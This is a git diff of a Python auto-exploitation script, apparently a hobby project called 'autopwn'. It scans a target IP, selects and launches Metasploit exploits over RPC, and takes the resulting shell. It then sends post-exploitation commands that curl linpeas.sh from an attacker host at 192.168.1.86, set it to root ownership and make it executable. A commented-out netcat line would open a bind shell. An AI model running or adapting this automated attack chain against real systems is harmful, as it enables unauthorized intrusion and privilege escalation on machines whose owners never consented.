@@ -62,7 +62,7 @@ def show_pwnguin():
     )
 
 
-def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, cmd=CMD, ip=IP):
+def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, cmd=CMD, ip=IP) -> list:
     """Scans IP loofing for vulnerabilities and output the
     related exploit list to be parsed (in json)
     """
@@ -80,7 +80,7 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, cmd=CMD, ip=IP):
     return result
 
 
-def createExploitList(res=[]):
+def createExploitList(res=[]) -> list[str]:
     """Create exploits / metasploits lists from the list of research
     returns (titles, metaexploits)
     """
@@ -104,11 +104,11 @@ def createExploitList(res=[]):
     return (titles, metaexploits)
 
 
-def selectExploit(choice=0, titles=[]):
+def selectExploit(choice=0, titles=[]) -> str:
     return titles[int(choice)][1][:-12]
 
 
-def runMetasploit(reinit=False):
+def runMetasploit(reinit=False) -> MsfRpcClient:
     """Launch metasploit instance and returns associated client
     It is also possible to reinit the db if reinit = True (must be root!!!)
     """
@@ -125,7 +125,7 @@ def runMetasploit(reinit=False):
     return client
 
 
-def selectModules(client=None, attack=""):
+def selectModules(client=None, attack="") -> list[str]:
     modules = client.modules.search(attack)
     modulus = []
     for mod in modules:
@@ -138,7 +138,7 @@ def selectModules(client=None, attack=""):
     return modulus
 
 
-def exploitVuln(client=None, modlist=[]):
+def exploitVuln(client=None, modlist=[]) -> None:
     """Execute selected payload on the targeted"""
     exploit = client.modules.use(modlist[0][0], modlist[0][1])
     print("[V] Selected payloads: ", exploit.info)
@@ -175,7 +175,9 @@ def exploitVuln(client=None, modlist=[]):
         exploit[i] = input(i + ": ")
 
     print(exploit.execute(payload=payload))
-    time.sleep(15)
+
+    while len(client.jobs.list) != 0:
+        pass
 
 
 def getShell(client=None, id="1"):
@@ -184,7 +186,7 @@ def getShell(client=None, id="1"):
     return client.sessions.session(id)
 
 
-def main():
+def autopwn():
     show_pwnguin()
 
     results = scanIp4Vulnerabilities(EXPLOIT_LIST, CMD, IP)
@@ -235,52 +237,58 @@ def main():
     (proc, port) = postexploit.openCtrlSrv("192.168.1.86")
     ipport = "http://192.168.1.86:" + str(port)
 
-    sequence = [
-        "curl " + ipport + "/post/vir/linpeas.sh -o linpeas.sh",
-        "chown root:root linpeas.sh",
-        "chmod +x linpeas.sh",
-        "./linpeas.sh -o users_information,software_information",
-    ]
-
-    if shell:
-        shell.write("pwd")
-        time.sleep(3)
-        res = shell.read()
-        print(res)
-        shell.write("whoami")
-        time.sleep(3)
-        res = shell.read()
-        print(res)
-        shell.write("ifconfig")
-        time.sleep(6)
-        res = shell.read()
-        time.sleep(6)
-        print(res)
-        shell.write(sequence[0])
-        time.sleep(6)
-        print(shell.read())
-        shell.write(sequence[1])
-        time.sleep(6)
-        print(shell.read())
-        shell.write(sequence[2])
-        time.sleep(6)
-        print(shell.read())
-        shell.write(sequence[3])
-        time.sleep(90)
-        print(shell.read())
-        # print(PROMPT + "nc -l -p 55555 -e /bin/sh")
-        # shell.write("nc -l -p 55555 -e /bin/sh")
-        # print("\n")
-    else:
-        LOG("Error 4 : Could not get a shell.", logfile, "err")
-        print("[X] Error 4 : Could not get a shell.")
-        exit(-4)
-
     print("[V] Pwn complete !!! ")
-    LOG("END OF LOGS", logfile, "crit")
-    logfile.close()
-    exit(0)
+    return (shell, client, ipport)
+
+ # ,
+    # "./linpeas.sh -o users_information,software_information"]
+
+# if shell:
+#     for command in sequence:
+#         print(command)
+#         shell.write(command)
+#         time.sleep(5) # Todo : modifier le sleep
+#         print(shell.read())
+#         if(str(shell.read()).isprintable()):
+#             print(str(shell.read()))
+#         else:
+#             print("coucou")
+
+def sendCommands(shell, sequence=[]) -> int:
+    """Automated interaction with shell on target"""
+    if (len(sequence) == 0):
+        print("[X] Error 5 : Invalid sequence.")
+        LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
+        return -5
+    
+    # if (shell == None):
+    #     print("[X] Error 6 : Invalid shell.")
+    #     LOG("[X] Error 6 : Invalid shell.", logfile, "err")
+    #     return -6
+    
+    for command in sequence:
+        print(command)
+        shell.write(command)
+        time.sleep(5) # Todo : modifier le sleep
+        print(shell.read())
+    return 0
 
 
-if __name__ == "__main__":
-    main()
+
+(shell, client, srv) = autopwn()
+
+sequence = [
+        "whoami",
+        "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
+        "pwd",
+        "chown root:root linpeas.sh",
+        "echo 0xcafedeadbeef",
+        "chmod +x linpeas.sh",
+        "echo matthislemechan"
+] 
+
+lol = sendCommands(shell,sequence)
+
+LOG("END OF LOGS", logfile, "crit")
+logfile.close()
+exit(0)
